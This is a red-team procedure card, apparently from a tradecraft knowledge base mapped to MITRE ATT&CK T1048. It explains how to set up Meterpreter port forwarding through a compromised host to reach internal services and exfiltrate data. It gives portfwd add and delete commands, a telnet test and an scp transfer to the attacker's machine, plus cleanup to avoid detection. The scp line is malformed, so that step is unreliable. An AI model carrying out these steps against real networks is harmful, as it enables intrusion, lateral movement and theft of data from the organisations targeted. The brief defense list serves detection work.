---
id: ef81f284-c57c-460d-8f97-96bb7c1dca28
name: Meterpreter-Port-Forwarding-Setup
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:21.457851+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Exfiltration|TA0010 - Exfiltration]]'
techniques:
  - >-
    [[techniques/Exfiltration Over Alternative Protocol|T1048 - Exfiltration
    Over Alternative Protocol]]
sub_techniques: []
tags:
  - '[[tags/Metasploit]]'
  - '[[tags/Meterpreter-Basic]]'
  - '[[tags/Portforward]]'
commands:
  - '[[commands/meterpreter-portfwd-add]]'
platforms:
  - Windows
  - Linux
tools:
  - '[[tools/Metasploit]]'
validated: true
---

# Meterpreter-Port-Forwarding-Setup

## Summary

This procedure demonstrates how to set up port forwarding using Meterpreter to tunnel traffic through a compromised host, enabling access to internal services or data exfiltration that would otherwise be blocked by firewalls or network segmentation.

## Description

Meterpreter, a payload within the Metasploit Framework, allows post-exploitation activities on compromised systems. The portfwd command creates a local port forward from the attacker's machine to a remote host via the compromised system, effectively bypassing network restrictions. This is particularly useful in scenarios where direct access to internal resources is needed for lateral movement or exfiltration. The technique maps to MITRE ATT&CK T1048, as it facilitates data transfer over alternative protocols by tunneling through the established Meterpreter session. Target environments typically include enterprise networks with firewalls isolating segments.

## Requirements

1. Active Meterpreter session on a compromised host with outbound internet access.
2. Knowledge of the internal network topology, including target remote host IP and service port.
3. Metasploit Framework installed on the attacker's machine.
4. Listener or client application on the attacker's side to connect to the forwarded port.

## Defense

- Implement application whitelisting to restrict execution of Metasploit payloads.
- Monitor for anomalous outbound connections from internal hosts and unexpected port forwarding patterns.
- Use host-based firewalls to limit unnecessary port bindings on compromised systems.
- Enable detailed logging of network tunnels and inspect for Meterpreter-like traffic signatures.

## Objectives

1. Establish a port forward tunnel through the compromised host to access internal services.
2. Bypass firewall restrictions for lateral movement or data access.
3. Enable secure exfiltration of data from isolated network segments.

## Instructions

### Step 1: Establish Meterpreter Session

**Context**: Ensure you have an active Meterpreter session on the compromised target. This is the foundation for all post-exploitation activities, including port forwarding.

If not already established, use Metasploit to exploit and gain the session (refer to initial access procedures for details).

**Expected Output**: Meterpreter prompt (`meterpreter >`) indicating a live session.

### Step 2: Add Port Forwarding Rule

**Context**: Use the portfwd add command to create the tunnel. This binds a local port on your attack machine to a remote port on an internal host, routing through the compromised system. Choose unused local ports to avoid conflicts.

**Command** ([[commands/meterpreter-portfwd-add]]):
```meterpreter
portfwd add -l $_LOCAL_PORT -r $_REMOTE_HOST -p $_REMOTE_PORT
```

> The command forwards traffic from your local machine's specified port to the remote host's port via the Meterpreter session. Replace placeholders with actual values (e.g., local port 7777, remote host 172.17.0.2, remote port 3006). This step accomplishes the core tunneling objective.

**Expected Output**: Confirmation message like "[*] Local port forwarding configured: 127.0.0.1:7777 => 172.17.0.2:3006".

### Step 3: Verify Port Forward

**Context**: Test the forward by attempting a connection from your local machine to the local port. This confirms the tunnel is operational and can be used for further actions like connecting to internal services.

Use a tool like telnet or netcat to test:
```bash
telnet localhost $_LOCAL_PORT
```

**Expected Output**: Successful connection to the remote service, such as a login prompt if forwarding to SSH, or data response from the internal service.

### Step 4: Utilize the Tunnel for Exfiltration

**Context**: With the tunnel active, perform actions like file transfers or remote access through the forwarded port. For exfiltration, you might SCP files or use the tunnel for HTTP requests to pull data.

Example using SCP over the tunnel (if forwarding SSH):
```bash
scp user@localhost:$_LOCAL_PORT:/path/to/data ./exfil_data
```

**Expected Output**: Data successfully transferred to the attacker's machine without direct exposure.

### Step 5: Clean Up Forwarding Rule

**Context**: Remove the port forward after use to minimize detection risk and free resources.

**Command**:
```meterpreter
portfwd delete -l $_LOCAL_PORT -r $_REMOTE_HOST -p $_REMOTE_PORT
```

> This reverses the add command, stopping the tunnel.

**Expected Output**: Confirmation like "[*] Removed port forward: 127.0.0.1:7777 => 172.17.0.2:3006".
